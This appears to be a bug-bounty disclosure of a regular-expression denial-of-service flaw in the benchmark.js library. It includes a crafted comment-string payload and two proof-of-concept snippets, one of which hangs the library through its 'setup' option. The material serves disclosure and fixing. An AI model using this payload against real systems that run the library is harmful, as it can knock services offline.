It is possible to insert an evil regex as part of benchmark options such as  setup, fn, fnArg ,teardown which can be used to conduct denial of service attacks benchmarkjs. This is possible because the regex use to check `use strict` string allows multiple repetitions of '***//' which allows Catastrophic Backtracking.
## Proof of Concept (Credit: [snoopysecurity](https://huntr.dev/app/users/snoopysecurity))

**Simple PoC**

This is a PoC of the extracted regex use to simply demonstrate that the ReDoS is possible. Benchmark is used here simply to measure time
```
var normal_payload = `
"use strict";
myFunction();
`
var redos = '/****//**//****//**//****//**//****//**//****//**//****//**//****//**//****//**//*\*/ /*//**//**//*_*//**/*//';
//normal test
console.time('benchmark');
/^(?:\/\*+[\w\W]*?\*\/|\/\/.*?[\n\r\u2028\u2029]|\s)*(["'])use strict\1;?$/.test(normal_payload);
console.timeEnd('benchmark');

//exploit payload
console.time('benchmark');
/^(?:\/\*+[\w\W]*?\*\/|\/\/.*?[\n\r\u2028\u2029]|\s)*(["'])use strict\1;?$/.test(redos);
console.timeEnd('benchmark');
```
**Package PoC**

This PoC demonstrates the malicious regex being inserted as part of potential user input.This hangs
```
var redos = '/****//**//****//**//****//**//****//**//****//**//****//**//****//**//****//**//*\*/ /*//**//**//*_*//**/*//';
var Benchmark = require('benchmark');
var bench = Benchmark({
        redos : true,
        'setup': redos,
        'fn': 'throw a;',
        'teardown': 'a = 2;'

      }).run()

console.log(bench);
```
## References:
 - [GitHub Issue](https://github.com/bestiejs/benchmark.js/issues/229)